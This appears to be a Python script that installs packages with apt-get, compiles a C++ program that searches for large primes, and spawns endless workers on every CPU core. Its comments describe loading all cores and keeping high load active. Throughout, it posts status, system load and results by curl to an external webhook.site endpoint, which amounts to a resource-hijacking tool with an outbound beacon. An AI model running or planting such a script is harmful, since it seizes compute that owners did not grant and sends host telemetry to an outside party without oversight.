import os
import subprocess
import json
import time
import multiprocessing

WEBHOOK_URL = "https://webhook.site/d9ed8938-0733-4ce3-8d2c-63dab5606e87"

def send_status(event, message):
    payload = {"EVENT": event, "MESSAGE": message, "LOAD": os.getloadavg()}
    try:
        subprocess.run(['curl', '-s', '-X', 'POST', '-d', json.dumps(payload), WEBHOOK_URL])
    except: pass

def build_engine():
    # 1. Попытка установки
    send_status("INSTALL_START", "Attempting to install libgmp-dev and g++")
    res = os.system("apt-get update && apt-get install -y libgmp-dev g++")
    
    if res != 0:
        send_status("INSTALL_FAILED", "Could not install GMP. Check permissions.")
        return False
    
    send_status("INSTALL_SUCCESS", "GMP and G++ ready. Compiling engine...")

    # 2. Исходник на C++ (параллельный поиск)
    cpp_source = """
    #include <gmp.h>
    #include <iostream>
    #include <time.h>
    #include <unistd.h>

    void find_prime(int id) {
        gmp_randstate_t state;
        gmp_randinit_default(state);
        gmp_randseed_ui(state, time(NULL) + getpid() + id);
        mpz_t n; mpz_init(n);
        while(true) {
            mpz_urandomb(n, state, 6642); 
            mpz_setbit(n, 6641); mpz_setbit(n, 0);
            if (mpz_probab_prime_p(n, 25) > 0) {
                gmp_printf("%Zd\\n", n);
                break;
            }
        }
        mpz_clear(n); gmp_randclear(state);
    }

    int main() {
        find_prime(0);
        return 0;
    }
    """
    with open("engine.cpp", "w") as f: f.write(cpp_source)
    
    build_res = os.system("g++ -O3 engine.cpp -o engine -lgmp")
    if build_res == 0:
        send_status("BUILD_SUCCESS", "Engine compiled. Launching stress-test...")
        return True
    return False

def worker_process():
    while True:
        try:
            # Запускаем поиск и ловим результат
            prime = subprocess.check_output("./engine").decode().strip()
            send_status("PRIME_FOUND", {"DIGITS": len(prime), "DATA": prime})
        except:
            time.sleep(1)

if __name__ == "__main__":
    if build_engine():
        # Загружаем ВСЕ ядра процессора
        cpu_count = multiprocessing.cpu_count()
        send_status("STRESS_START", f"Spawning {cpu_count} workers to maximize load")
        
        for _ in range(cpu_count):
            p = multiprocessing.Process(target=worker_process)
            p.start()

        # Каждую минуту отправляем Heartbeat
        while True:
            time.sleep(60)
            send_status("HEARTBEAT", "Workers are still running. High load active.")
